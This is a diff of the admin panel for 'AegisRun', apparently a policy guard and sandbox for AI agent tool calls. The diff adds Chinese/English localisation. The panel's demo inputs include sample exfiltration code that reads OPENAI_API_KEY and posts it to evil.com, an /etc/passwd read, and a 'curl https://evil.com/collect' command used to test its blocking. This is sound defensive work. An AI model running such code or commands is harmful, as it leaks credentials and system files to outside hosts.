@@ -10,6 +10,10 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Helvetica,Arial,san
 h1{font-size:22px;font-weight:600;display:inline}
 header{display:flex;align-items:center;gap:12px;margin-bottom:16px}
 .version-badge{font-size:11px;padding:2px 8px;border-radius:10px;background:#1a2332;color:var(--accent);border:1px solid var(--accent);font-weight:500}
+.lang-toggle{margin-left:auto;display:flex;align-items:center;gap:4px}
+.lang-toggle button{background:none;border:1px solid var(--border);color:var(--dim);padding:3px 10px;cursor:pointer;font-size:12px;border-radius:4px;transition:all .15s}
+.lang-toggle button.active{background:var(--accent);color:white;border-color:var(--accent)}
+.lang-toggle button:hover:not(.active){background:var(--card);color:var(--text)}
 nav{display:flex;gap:2px;margin-bottom:20px;flex-wrap:wrap}
 nav button{background:none;border:none;color:var(--dim);padding:7px 14px;cursor:pointer;font-size:13px;border-radius:6px;transition:all .15s}
 nav button:hover{background:var(--card);color:var(--text)}
@@ -63,40 +67,44 @@ pre{background:var(--bg);border:1px solid var(--border);border-radius:6px;paddin
 <body>
 <header>
   <h1>AegisRun</h1>
-  <span style="color:var(--dim);font-size:13px">Admin Panel</span>
+  <span style="color:var(--dim);font-size:13px" data-i18n="header_subtitle">Admin Panel</span>
   <span class="version-badge">v0.9.2</span>
+  <div class="lang-toggle">
+    <button class="active" onclick="setLang('zh',this)">中文</button>
+    <button onclick="setLang('en',this)">EN</button>
+  </div>
 </header>
 
 <nav>
-  <button class="active" onclick="switchTab('dashboard',this)">Dashboard</button>
-  <button onclick="switchTab('domains',this)">Domain</button>
-  <button onclick="switchTab('paths',this)">Path</button>
-  <button onclick="switchTab('env',this)">Env</button>
-  <button onclick="switchTab('tools',this)">Tool</button>
-  <button onclick="switchTab('audit',this)">Audit</button>
+  <button class="active" onclick="switchTab('dashboard',this)" data-i18n="nav_dashboard">Dashboard</button>
+  <button onclick="switchTab('domains',this)" data-i18n="nav_domains">Domain</button>
+  <button onclick="switchTab('paths',this)" data-i18n="nav_paths">Path</button>
+  <button onclick="switchTab('env',this)" data-i18n="nav_env">Env</button>
+  <button onclick="switchTab('tools',this)" data-i18n="nav_tools">Tool</button>
+  <button onclick="switchTab('audit',this)" data-i18n="nav_audit">Audit</button>
   <span class="nav-sep">|</span>
-  <button onclick="switchTab('sandbox',this)">Sandbox</button>
+  <button onclick="switchTab('sandbox',this)" data-i18n="nav_sandbox">Sandbox</button>
   <span class="nav-sep">|</span>
-  <button onclick="switchTab('mcp',this)">MCP Agent</button>
+  <button onclick="switchTab('mcp',this)" data-i18n="nav_mcp">MCP Agent</button>
 </nav>
 
 <!-- ═══ Dashboard ═══ -->
 <main id="dashboard">
   <div class="grid">
     <div class="card">
-      <h3>Defense Layers</h3>
+      <h3 data-i18n="defense_layers">Defense Layers</h3>
       <div id="defense-toggles"></div>
     </div>
     <div class="card">
-      <h3>Statistics</h3>
+      <h3 data-i18n="statistics">Statistics</h3>
       <div class="grid" style="grid-template-columns:1fr 1fr">
-        <div class="stat"><div class="num green" id="stat-allowed">0</div><div style="font-size:12px;color:var(--dim)">Allowed</div></div>
-        <div class="stat"><div class="num red" id="stat-blocked">0</div><div style="font-size:12px;color:var(--dim)">Blocked</div></div>
+        <div class="stat"><div class="num green" id="stat-allowed">0</div><div style="font-size:12px;color:var(--dim)" data-i18n="allowed">Allowed</div></div>
+        <div class="stat"><div class="num red" id="stat-blocked">0</div><div style="font-size:12px;color:var(--dim)" data-i18n="blocked">Blocked</div></div>
       </div>
     </div>
   </div>
   <div class="card">
-    <h3>Preset</h3>
+    <h3 data-i18n="preset">Preset</h3>
     <select id="preset-select" onchange="applyPreset()">
       <option value="standard">Standard</option>
       <option value="strict">Strict</option>
@@ -108,19 +116,19 @@ pre{background:var(--bg);border:1px solid var(--border);border-radius:6px;paddin
 <!-- ═══ Domains ═══ -->
 <main id="domains" style="display:none">
   <div class="card">
-    <h3>Domain Blacklist</h3>
+    <h3 data-i18n="domain_blacklist">Domain Blacklist</h3>
     <div id="domain-blacklist"></div>
     <div style="display:flex;gap:4px;margin-top:8px">
       <input id="new-domain" placeholder="evil.com" onkeydown="if(event.key==='Enter')addItem('domain-bl')">
-      <button class="btn btn-danger" onclick="addItem('domain-bl')">Block</button>
+      <button class="btn btn-danger" onclick="addItem('domain-bl')" data-i18n="btn_block">Block</button>
     </div>
   </div>
   <div class="card">
-    <h3>Domain Whitelist</h3>
+    <h3 data-i18n="domain_whitelist">Domain Whitelist</h3>
     <div id="domain-whitelist"></div>
     <div style="display:flex;gap:4px;margin-top:8px">
       <input id="new-allow" placeholder="safe.com" onkeydown="if(event.key==='Enter')addItem('domain-wl')">
-      <button class="btn btn-green" onclick="addItem('domain-wl')">Allow</button>
+      <button class="btn btn-green" onclick="addItem('domain-wl')" data-i18n="btn_allow">Allow</button>
     </div>
   </div>
 </main>
@@ -128,11 +136,11 @@ pre{background:var(--bg);border:1px solid var(--border);border-radius:6px;paddin
 <!-- ═══ Paths ═══ -->
 <main id="paths" style="display:none">
   <div class="card">
-    <h3>Path Blacklist</h3>
+    <h3 data-i18n="path_blacklist">Path Blacklist</h3>
     <div id="path-blacklist"></div>
     <div style="display:flex;gap:4px;margin-top:8px">
       <input id="new-path" placeholder="/etc/passwd" onkeydown="if(event.key==='Enter')addItem('path-bl')">
-      <button class="btn btn-danger" onclick="addItem('path-bl')">Block</button>
+      <button class="btn btn-danger" onclick="addItem('path-bl')" data-i18n="btn_block">Block</button>
     </div>
   </div>
 </main>
@@ -140,11 +148,11 @@ pre{background:var(--bg);border:1px solid var(--border);border-radius:6px;paddin
 <!-- ═══ Env ═══ -->
 <main id="env" style="display:none">
   <div class="card">
-    <h3>Sensitive Env Patterns</h3>
+    <h3 data-i18n="env_patterns">Sensitive Env Patterns</h3>
     <div id="env-patterns"></div>
     <div style="display:flex;gap:4px;margin-top:8px">
       <input id="new-env" placeholder="MY_API_KEY" onkeydown="if(event.key==='Enter')addItem('env-pattern')">
-      <button class="btn btn-danger" onclick="addItem('env-pattern')">Add</button>
+      <button class="btn btn-danger" onclick="addItem('env-pattern')" data-i18n="btn_add">Add</button>
     </div>
   </div>
 </main>
@@ -152,11 +160,11 @@ pre{background:var(--bg);border:1px solid var(--border);border-radius:6px;paddin
 <!-- ═══ Tools ═══ -->
 <main id="tools" style="display:none">
   <div class="card">
-    <h3>Tool Blacklist</h3>
+    <h3 data-i18n="tool_blacklist">Tool Blacklist</h3>
     <div id="tool-blacklist"></div>
     <div style="display:flex;gap:4px;margin-top:8px">
       <input id="new-tool" placeholder="tool-id" onkeydown="if(event.key==='Enter')addItem('tool-bl')">
-      <button class="btn btn-danger" onclick="addItem('tool-bl')">Block</button>
+      <button class="btn btn-danger" onclick="addItem('tool-bl')" data-i18n="btn_block">Block</button>
     </div>
   </div>
 </main>
@@ -164,21 +172,20 @@ pre{background:var(--bg);border:1px solid var(--border);border-radius:6px;paddin
 <!-- ═══ Audit ═══ -->
 <main id="audit" style="display:none">
   <div class="card">
-    <h3>Audit Log <button onclick="fetch('/api/clear-audit',{method:'POST'}).then(()=>fetchAudit())" style="float:right;font-size:12px;padding:2px 8px;cursor:pointer;background:var(--red);color:white;border:none;border-radius:4px">Clear</button></h3>
+    <h3><span data-i18n="audit_log">Audit Log</span> <button onclick="fetch('/api/clear-audit',{method:'POST'}).then(()=>fetchAudit())" style="float:right;font-size:12px;padding:2px 8px;cursor:pointer;background:var(--red);color:white;border:none;border-radius:4px" data-i18n="btn_clear">Clear</button></h3>
     <div id="audit-log" style="max-height:600px;overflow-y:auto"></div>
   </div>
 </main>
 
-<!-- ═══ Sandbox (web-side scan + runtime) ═══ -->
+<!-- ═══ Sandbox ═══ -->
 <main id="sandbox" style="display:none">
   <div class="card">
-    <h3>Security Check</h3>
+    <h3 data-i18n="security_check">Security Check</h3>
     <div class="seg-ctrl">
-      <button class="active" onclick="setSandboxMode('static',this)">Static Scan</button>
-      <button onclick="setSandboxMode('runtime',this)">Runtime Sandbox</button>
+      <button class="active" onclick="setSandboxMode('static',this)" data-i18n="mode_static">Static Scan</button>
+      <button onclick="setSandboxMode('runtime',this)" data-i18n="mode_runtime">Runtime Sandbox</button>
     </div>
     <div id="sandbox-mode-hint" style="font-size:12px;color:var(--dim);margin-bottom:8px;line-height:1.6">
-      Static analysis: scan source code for malicious patterns (env theft, data exfiltration, shell injection, etc.)
     </div>
     <textarea id="sandbox-code" rows="10" style="width:100%">import os
 key = os.environ.get("OPENAI_API_KEY")
@@ -186,21 +193,19 @@ import requests
 requests.post("https://evil.com/steal", data={"key": key})
 open("/etc/passwd")</textarea>
     <div style="display:flex;gap:8px;margin-top:8px">
-      <button class="btn btn-primary" onclick="runCheck()">Run</button>
-      <button class="btn" style="background:var(--card);color:var(--dim);border:1px solid var(--border)" onclick="document.getElementById('sandbox-code').value=''">Clear</button>
+      <button class="btn btn-primary" onclick="runCheck()" data-i18n="btn_run">Run</button>
+      <button class="btn" style="background:var(--card);color:var(--dim);border:1px solid var(--border)" onclick="document.getElementById('sandbox-code').value=''" data-i18n="btn_clear2">Clear</button>
     </div>
     <div id="sandbox-result" style="margin-top:12px"></div>
   </div>
 </main>
 
-<!-- ═══ MCP Agent (interactive) ═══ -->
+<!-- ═══ MCP Agent ═══ -->
 <main id="mcp" style="display:none">
   <div class="grid">
     <div class="card">
-      <h3>MCP Endpoint</h3>
-      <div style="font-size:12px;color:var(--dim);line-height:1.7;margin-bottom:8px">
-        Agent calls AegisRun via MCP for real-time policy checks, code scanning, and runtime sandboxing.
-      </div>
+      <h3 data-i18n="mcp_endpoint">MCP Endpoint</h3>
+      <div id="mcp-desc" style="font-size:12px;color:var(--dim);line-height:1.7;margin-bottom:8px"></div>
       <pre>{
   "mcpServers": {
     "aegisrun": {
@@ -208,25 +213,18 @@ open("/etc/passwd")</textarea>
     }
   }
 }</pre>
-      <button class="btn btn-purple" onclick="fetchMcpTools()" style="margin-top:8px">Refresh Tools</button>
+      <button class="btn btn-purple" onclick="fetchMcpTools()" style="margin-top:8px" data-i18n="btn_refresh_tools">Refresh Tools</button>
     </div>
     <div class="card">
-      <h3>Available Tools</h3>
-      <div id="mcp-tools" style="font-size:13px;color:var(--dim)">Loading...</div>
+      <h3 data-i18n="available_tools">Available Tools</h3>
+      <div id="mcp-tools" style="font-size:13px;color:var(--dim)" data-i18n="loading">Loading...</div>
     </div>
   </div>
   <div class="card">
-    <h3>Interactive Call</h3>
+    <h3 data-i18n="interactive_call">Interactive Call</h3>
     <div style="display:flex;gap:8px;margin-bottom:8px">
-      <select id="mcp-tool-select" onchange="onMcpToolChange()" style="flex:1">
-        <option value="aegisrun.policy.check_domain">check_domain</option>
-        <option value="aegisrun.policy.check_path">check_path</option>
-        <option value="aegisrun.policy.check_env">check_env</option>
-        <option value="aegisrun.guard_tool_call">guard_tool_call</option>
-        <option value="aegisrun.scan_code">scan_code</option>
-        <option value="aegisrun.policy.summary">policy.summary</option>
-      </select>
-      <button class="btn btn-primary" onclick="callMcpTool()">Call</button>
+      <select id="mcp-tool-select" onchange="onMcpToolChange()" style="flex:1"></select>
+      <button class="btn btn-primary" onclick="callMcpTool()" data-i18n="btn_call">Call</button>
     </div>
     <textarea id="mcp-args" rows="6" style="width:100%">{
   "domain": "evil.com"
@@ -236,8 +234,88 @@ open("/etc/passwd")</textarea>
 </main>
 
 <script>
+// ── i18n ──
+const I18N = {
+  zh: {
+    header_subtitle: '管理面板',
+    nav_dashboard: '仪表盘', nav_domains: '域名策略', nav_paths: '路径策略', nav_env: '环境变量', nav_tools: '工具管理', nav_audit: '审计日志', nav_sandbox: '沙箱检测', nav_mcp: 'MCP Agent',
+    defense_layers: '防御层状态', statistics: '实时统计', allowed: '放行', blocked: '拦截', preset: '预设模板',
+    domain_blacklist: '域名黑名单', domain_whitelist: '域名白名单',
+    path_blacklist: '路径黑名单', env_patterns: '敏感环境变量', tool_blacklist: '工具黑名单',
+    audit_log: '审计日志', btn_clear: '清空',
+    btn_block: '封禁', btn_allow: '放行', btn_add: '添加', btn_run: '运行', btn_clear2: '清除',
+    security_check: '安全检测',
+    mode_static: '静态扫描', mode_runtime: '运行时沙箱',
+    hint_static: '静态分析：扫描源码中的恶意模式（环境变量窃取、数据外泄、Shell 注入等）',
+    hint_runtime: '运行时沙箱：通过 Python audit hook 拦截 open/env/network/subprocess 等操作',
+    mcp_endpoint: 'MCP 端点',
+    mcp_desc: 'Agent 通过 MCP 实时调用 AegisRun 进行策略检查、代码扫描和运行时沙箱检测。',
+    available_tools: '可用工具', loading: '加载中...', btn_refresh_tools: '刷新工具',
+    interactive_call: '交互式调用', btn_call: '调用',
+    finding_clean: 'CLEAN - 未发现违规', finding_blocked: 'BLOCKED', finding_flagged: 'FLAGGED',
+    checking: '检测中...', scan_failed: '请求失败',
+    stat_static: '静态', stat_runtime: '运行时', stat_blocked_label: '拦截',
+    layer_runtime: '运行时沙箱', layer_domain: '域名黑名单', layer_path_env: '路径+环境变量', layer_scanner: '扫描器', layer_wasm: 'Wasm 沙箱',
+    mcp_no_tools: '无工具', mcp_unavailable: 'MCP 端点不可用',
+    mcp_calling: '调用中...', mcp_bad_json: '参数 JSON 格式错误', mcp_call_failed: '调用失败',
+  },
+  en: {
+    header_subtitle: 'Admin Panel',
+    nav_dashboard: 'Dashboard', nav_domains: 'Domain', nav_paths: 'Path', nav_env: 'Env', nav_tools: 'Tool', nav_audit: 'Audit', nav_sandbox: 'Sandbox', nav_mcp: 'MCP Agent',
+    defense_layers: 'Defense Layers', statistics: 'Statistics', allowed: 'Allowed', blocked: 'Blocked', preset: 'Preset',
+    domain_blacklist: 'Domain Blacklist', domain_whitelist: 'Domain Whitelist',
+    path_blacklist: 'Path Blacklist', env_patterns: 'Sensitive Env Patterns', tool_blacklist: 'Tool Blacklist',
+    audit_log: 'Audit Log', btn_clear: 'Clear',
+    btn_block: 'Block', btn_allow: 'Allow', btn_add: 'Add', btn_run: 'Run', btn_clear2: 'Clear',
+    security_check: 'Security Check',
+    mode_static: 'Static Scan', mode_runtime: 'Runtime Sandbox',
+    hint_static: 'Static analysis: scan source code for malicious patterns (env theft, data exfiltration, shell injection, etc.)',
+    hint_runtime: 'Runtime sandbox: execute script with Python audit hooks to intercept open/env/network/subprocess at runtime.',
+    mcp_endpoint: 'MCP Endpoint',
+    mcp_desc: 'Agent calls AegisRun via MCP for real-time policy checks, code scanning, and runtime sandboxing.',
+    available_tools: 'Available Tools', loading: 'Loading...', btn_refresh_tools: 'Refresh Tools',
+    interactive_call: 'Interactive Call', btn_call: 'Call',
+    finding_clean: 'CLEAN - no violations found', finding_blocked: 'BLOCKED', finding_flagged: 'FLAGGED',
+    checking: 'Checking...', scan_failed: 'Request failed',
+    stat_static: 'Static', stat_runtime: 'Runtime', stat_blocked_label: 'Blocked',
+    layer_runtime: 'Runtime Sandbox', layer_domain: 'Domain Blacklist', layer_path_env: 'Path + Env', layer_scanner: 'Scanner', layer_wasm: 'Wasm Sandbox',
+    mcp_no_tools: 'No tools', mcp_unavailable: 'MCP endpoint unavailable',
+    mcp_calling: 'Calling...', mcp_bad_json: 'Invalid JSON in arguments', mcp_call_failed: 'Call failed',
+  }
+};
+let currentLang = 'zh';
+
+function t(key) { return (I18N[currentLang] && I18N[currentLang][key]) || (I18N.en[key]) || key; }
+
+function applyI18n() {
+  document.querySelectorAll('[data-i18n]').forEach(el => {
+    const key = el.getAttribute('data-i18n');
+    if (I18N[currentLang] && I18N[currentLang][key]) {
+      el.textContent = I18N[currentLang][key];
+    }
+  });
+  // Dynamic text that changes with sandbox mode
+  document.getElementById('sandbox-mode-hint').textContent = t(sandboxMode === 'runtime' ? 'hint_runtime' : 'hint_static');
+  // MCP desc
+  document.getElementById('mcp-desc').textContent = t('mcp_desc');
+  // Re-render defense layer names
+  renderDefense();
+}
+
+function setLang(lang, btn) {
+  currentLang = lang;
+  document.querySelectorAll('.lang-toggle button').forEach(b => b.classList.remove('active'));
+  if (btn) btn.classList.add('active');
+  applyI18n();
+}
+
+// ── State ──
 let policy = {};
 let sandboxMode = 'static';
+const LAYER_NAMES = {
+  zh: {layer1:'运行时沙箱',layer2:'域名黑名单',layer3:'路径+环境变量',layer4:'扫描器',layer5:'Wasm 沙箱'},
+  en: {layer1:'Runtime Sandbox',layer2:'Domain Blacklist',layer3:'Path + Env',layer4:'Scanner',layer5:'Wasm Sandbox'}
+};
 
 function render(){
   document.getElementById('preset-select').value = policy.preset||'standard';
@@ -250,7 +328,7 @@ function render(){
   renderTags('tool-blacklist', []);
 }
 function renderDefense(){
-  const names={layer1:'Runtime Sandbox',layer2:'Domain Blacklist',layer3:'Path + Env',layer4:'Scanner',layer5:'Wasm Sandbox'};
+  const names = LAYER_NAMES[currentLang] || LAYER_NAMES.en;
   let h='';
   if(policy.defense) Object.entries(policy.defense).forEach(([k,v])=>{
     h+=`<div class="row"><span style="font-size:13px"><span class="status-dot ${v?'on':'off'}"></span>${names[k]||k}</span><label class="toggle"><input type="checkbox" ${v?'checked':''} onchange="toggleDefense('${k}')"><span class="slider"></span></label></div>`;
@@ -284,47 +362,45 @@ function applyPreset(){
 function toggleDefense(k){
   fetch('/api/toggle/'+k,{method:'POST'}).then(()=>fetchPolicy()).catch(()=>{});
 }
-function switchTab(t,btn){
+function switchTab(tab,btn){
   document.querySelectorAll('main').forEach(m=>m.style.display='none');
-  document.getElementById(t).style.display='block';
+  document.getElementById(tab).style.display='block';
   document.querySelectorAll('nav button').forEach(b=>b.classList.remove('active'));
   if(btn)btn.classList.add('active');
-  if(t==='mcp') fetchMcpTools();
+  if(tab==='mcp') fetchMcpTools();
 }
 
 // ── Sandbox ──
 function setSandboxMode(mode,btn){
   sandboxMode=mode;
-  document.querySelectorAll('.seg-ctrl button').forEach(b=>b.classList.remove('active'));
+  document.querySelectorAll('#sandbox .seg-ctrl button').forEach(b=>b.classList.remove('active'));
   btn.classList.add('active');
-  document.getElementById('sandbox-mode-hint').textContent = mode==='static'
-    ? 'Static analysis: scan source code for malicious patterns (env theft, data exfiltration, shell injection, etc.)'
-    : 'Runtime sandbox: execute script with Python audit hooks to intercept open/env/network/subprocess at runtime.';
+  document.getElementById('sandbox-mode-hint').textContent = t(mode==='runtime' ? 'hint_runtime' : 'hint_static');
 }
 function runCheck(){
   const code=document.getElementById('sandbox-code').value;
   const resultEl=document.getElementById('sandbox-result');
-  resultEl.innerHTML='<span style="color:var(--dim)">Checking...</span>';
+  resultEl.innerHTML=`<span style="color:var(--dim)">${t('checking')}</span>`;
   const endpoint = sandboxMode==='runtime' ? '/api/sandbox-run' : '/api/scan';
   fetch(endpoint,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({code:code})})
     .then(r=>r.json()).then(d=>{
       let h='';
       if(sandboxMode==='runtime' && d.static_findings!==undefined){
-        h+=`<div style="margin-bottom:6px;font-size:12px;color:var(--dim)">Static: ${d.static_findings} | Runtime: ${d.runtime_findings} | Blocked: <strong style="color:${d.violations>0?'var(--red)':'var(--green)'}">${d.violations}</strong></div>`;
+        h+=`<div style="margin-bottom:6px;font-size:12px;color:var(--dim)">${t('stat_static')}: ${d.static_findings} | ${t('stat_runtime')}: ${d.runtime_findings} | ${t('stat_blocked_label')}: <strong style="color:${d.violations>0?'var(--red)':'var(--green)'}">${d.violations}</strong></div>`;
       }
       if(!d.findings||!d.findings.length){
-        h+='<div class="finding-line finding-allowed">CLEAN - no violations found</div>';
+        h+=`<div class="finding-line finding-allowed">${t('finding_clean')}</div>`;
       } else {
         d.findings.forEach(function(f){
           const cls=f.blocked?'finding-blocked':'finding-flagged';
-          const tag=f.blocked?'BLOCKED':'FLAGGED';
+          const tag=f.blocked?t('finding_blocked'):t('finding_flagged');
           const line=f.line>0?'L'+f.line+' ':'';
           h+=`<div class="finding-line ${cls}">${line}[${f.kind}] ${escHtml(f.value)} &mdash; ${tag}</div>`;
         });
       }
       resultEl.innerHTML=h;
       fetchAudit();
-    }).catch(e=>{resultEl.innerHTML='<span style="color:var(--red)">Request failed</span>';});
+    }).catch(()=>{resultEl.innerHTML=`<span style="color:var(--red)">${t('scan_failed')}</span>`;});
 }
 
 // ── MCP ──
@@ -334,33 +410,35 @@ const mcpToolArgs = {
   'aegisrun.policy.check_env': '{\n  "varname": "OPENAI_API_KEY"\n}',
   'aegisrun.guard_tool_call': '{\n  "domains": ["evil.com"],\n  "paths": ["/etc/passwd"],\n  "env": ["OPENAI_API_KEY"],\n  "command": "curl https://evil.com/collect"\n}',
   'aegisrun.scan_code': '{\n  "code": "import os\\nkey = os.environ.get(\\"OPENAI_API_KEY\\")"\n}',
-  'aegisrun.policy.summary': '{}'
+  'aegisrun.policy.summary': '{}',
+  'aegisrun.scan_file': '{\n  "path": "test.py"\n}',
+  'aegisrun.sandbox_python': '{\n  "path": "test.py"\n}',
+  'aegisrun.sandbox_wasm': '{\n  "wasm": "tool.wasm"\n}'
 };
 function onMcpToolChange(){
-  const t=document.getElementById('mcp-tool-select').value;
-  document.getElementById('mcp-args').value=mcpToolArgs[t]||'{}';
+  const toolName=document.getElementById('mcp-tool-select').value;
+  document.getElementById('mcp-args').value=mcpToolArgs[toolName]||'{}';
 }
 function fetchMcpTools(){
   fetch('/mcp',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({jsonrpc:'2.0',id:1,method:'tools/list'})})
     .then(r=>r.json()).then(d=>{
       const tools=(d.result&&d.result.tools)||[];
       const el=document.getElementById('mcp-tools');
-      if(!tools.length){el.textContent='No tools';return;}
+      if(!tools.length){el.textContent=t('mcp_no_tools');return;}
       el.innerHTML=tools.map(t=>`<div class="mcp-tool"><div class="mcp-tool-name">${t.name}</div><div class="mcp-tool-desc">${escHtml(t.description)}</div></div>`).join('');
-      // update select
       const sel=document.getElementById('mcp-tool-select');
       sel.innerHTML=tools.map(t=>`<option value="${t.name}">${t.name.replace('aegisrun.','')}</option>`).join('');
       onMcpToolChange();
-    }).catch(()=>{document.getElementById('mcp-tools').textContent='MCP endpoint unavailable';});
+    }).catch(()=>{document.getElementById('mcp-tools').textContent=t('mcp_unavailable');});
 }
 function callMcpTool(){
-  const name=document.getElementById('mcp-tool-select').value;
+  const toolName=document.getElementById('mcp-tool-select').value;
   const argsText=document.getElementById('mcp-args').value;
   const resultEl=document.getElementById('mcp-call-result');
   let args;
-  try{args=JSON.parse(argsText);}catch(e){resultEl.innerHTML='<span style="color:var(--red)">Invalid JSON in arguments</span>';return;}
-  resultEl.innerHTML='<span style="color:var(--dim)">Calling...</span>';
-  const body=JSON.stringify({jsonrpc:'2.0',id:Date.now(),method:'tools/call',params:{name:name,arguments:args}});
+  try{args=JSON.parse(argsText);}catch(e){resultEl.innerHTML=`<span style="color:var(--red)">${t('mcp_bad_json')}</span>`;return;}
+  resultEl.innerHTML=`<span style="color:var(--dim)">${t('mcp_calling')}</span>`;
+  const body=JSON.stringify({jsonrpc:'2.0',id:Date.now(),method:'tools/call',params:{name:toolName,arguments:args}});
   fetch('/mcp',{method:'POST',headers:{'Content-Type':'application/json'},body:body})
     .then(r=>r.json()).then(d=>{
       if(d.error){
@@ -377,22 +455,27 @@ function callMcpTool(){
         resultEl.innerHTML=`<pre>${escHtml(JSON.stringify(d,null,2))}</pre>`;
       }
       fetchAudit();
-    }).catch(e=>{resultEl.innerHTML='<span style="color:var(--red)">Call failed</span>';});
+    }).catch(()=>{resultEl.innerHTML=`<span style="color:var(--red)">${t('mcp_call_failed')}</span>`;});
 }
 
+// ── Audit ──
 function fetchAudit(){
   fetch('/api/audit').then(r=>r.json()).then(function(list){
     var h='';
     list.forEach(function(a){
-      var t=new Date(parseInt(a.timestamp)*1000).toLocaleString();
+      var ts=new Date(parseInt(a.timestamp)*1000).toLocaleString();
       var c=a.decision==='DENY'?'log-block':'log-allow';
-      h+=`<div class="log-line ${c}"><strong>${t}</strong> [${escHtml(a.tool_id)}] ${escHtml(a.action)} <span style="color:${a.decision==='DENY'?'var(--red)':'var(--green)'}">${a.decision}</span> ${escHtml(a.reason)}</div>`;
+      h+=`<div class="log-line ${c}"><strong>${ts}</strong> [${escHtml(a.tool_id)}] ${escHtml(a.action)} <span style="color:${a.decision==='DENY'?'var(--red)':'var(--green)'}">${a.decision}</span> ${escHtml(a.reason)}</div>`;
     });
     document.getElementById('audit-log').innerHTML=h;
   }).catch(function(){});
 }
+
+// ── Utils ──
 function escHtml(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
 
+// ── Init ──
+applyI18n();
 fetchPolicy();
 fetch('/api/defense').then(r=>r.json()).then(d=>{if(policy)policy.defense=d;renderDefense();}).catch(()=>{});
 fetchAudit();
